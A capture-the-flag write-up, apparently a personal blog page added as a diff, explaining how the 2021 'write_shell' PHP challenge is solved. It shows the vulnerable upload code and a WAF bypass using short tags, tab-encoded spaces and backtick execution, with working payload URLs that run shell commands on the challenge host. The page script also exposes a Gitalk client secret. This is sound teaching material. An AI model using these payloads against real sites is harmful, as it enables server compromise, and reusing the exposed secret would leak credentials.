@@ -1,0 +1,299 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2021&#34;红明谷CTF&#34;write_shell | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2021&#34;红明谷CTF&#34;write_shell | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="2021&quot;红明谷CTF&quot;write_shell
+进入题目，就给了源码，审计一下
+&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+function check(..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2021&#34;红明谷CTF&#34;write_shell
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-11-22
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="2021红明谷ctfwrite_shell">2021&quot;红明谷CTF&quot;write_shell</h2>
+<p>进入题目，就给了源码，审计一下</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+function check($input){
+    if(preg_match(&quot;/'| |_|php|;|~|\\^|\\+|eval|{|}/i&quot;,$input)){
+        // if(preg_match(&quot;/'| |_|=|php/&quot;,$input)){
+        die('hacker!!!');
+    }else{
+        return $input;
+    }
+}
+
+function waf($input){
+  if(is_array($input)){
+      foreach($input as $key=&gt;$output){
+          $input[$key] = waf($output);
+      }
+  }else{
+      $input = check($input);
+  }
+}
+
+$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
+if(!file_exists($dir)){
+    mkdir($dir);
+}
+switch($_GET[&quot;action&quot;] ?? &quot;&quot;) {
+    case 'pwd':
+        echo $dir;
+        break;
+    case 'upload':
+        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;
+        waf($data);
+        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);
+}
+?&gt;
+</code></pre>
+<p>首先看下面这段代码，通过<code>Get</code>传参，有个开关，传入<code>pwd</code>，就会输出当前目录，传入<code>data</code>，则会将<code>data</code>通过<code>waf</code>检测，如果没有被拦截，<code>file_put_contents</code>则会在当前目录生成<code>index.php</code>，内容就是传入的data数据</p>
+<pre><code class="language-php">switch($_GET[&quot;action&quot;] ?? &quot;&quot;) {
+    case 'pwd':
+        echo $dir;
+        break;
+    case 'upload':
+        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;
+        waf($data);
+        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);
+}
+?&gt;
+</code></pre>
+<p>因为data可控，只需要绕过waf即可导致命令执行，waf绕过了php和空格，所以可以使用php短标签<code>&lt;? ?&gt;</code>,空格可以使用<code>%09</code>绕过，然后还有一个知识点就是 反引号可用来执行命令，反引号的作用等同于<code>shell_exec()</code></p>
+<p>PHP执行运算符—反引号：https://lkblog.net/notes/php/748.html</p>
+<p>所以可以构造：</p>
+<pre><code>http://1ce3abfd-1278-428d-9e2d-92293f0fbfe7.node4.buuoj.cn:81/?action=upload&amp;data=&lt;?echo%09`ls%09/`?&gt;
+</code></pre>
+<p>然后再访问：</p>
+<pre><code>http://1ce3abfd-1278-428d-9e2d-92293f0fbfe7.node4.buuoj.cn:81/?action=pwd
+</code></pre>
+<p>这样就会反回当前目录的路径，这个路径的index.php已经被写入了<code>ls /</code>，访问即可被执行</p>
+<figure data-type="image" tabindex="1"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/22/ff70c2fa4c5dc.png" alt="1637573969946.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/22/74330fd44cbd5.png" alt="1637573992904.png" loading="lazy"></figure>
+<p>接着修改刚刚的<code>ls%09/</code>为 <code>cat%09/flllllll1112222222lag</code>，然后执行</p>
+<pre><code>?action=upload&amp;data=&lt;?echo%09`cat%09/flllllll1112222222lag`?&gt;
+</code></pre>
+<p>此时再访问<code>?action=pwd</code>来获得新的路径，因为每次upload之后都会产生新的路径。</p>
+<figure data-type="image" tabindex="3"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/22/6c5ac22badbb8.png" alt="1637574264472.png" loading="lazy"></figure>
+<p>访问路径即可获得flag</p>
+<pre><code>http://1ce3abfd-1278-428d-9e2d-92293f0fbfe7.node4.buuoj.cn:81/sandbox/20dfe28d7f477f61445b994c831a601a/
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/22/4de940858afb4.png" alt="1637574311793.png" loading="lazy"></figure>
+<p>flag：</p>
+<pre><code>flag{0e8a470b-d6c7-4482-afed-7461b72983ad}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctfwrite_shell">2021&quot;红明谷CTF&quot;write_shell</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/2021西湖论剑_Light1ng/">
+              <h3 class="post-title">
+                2021&#34;西湖论剑&#34;网络安全大赛Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
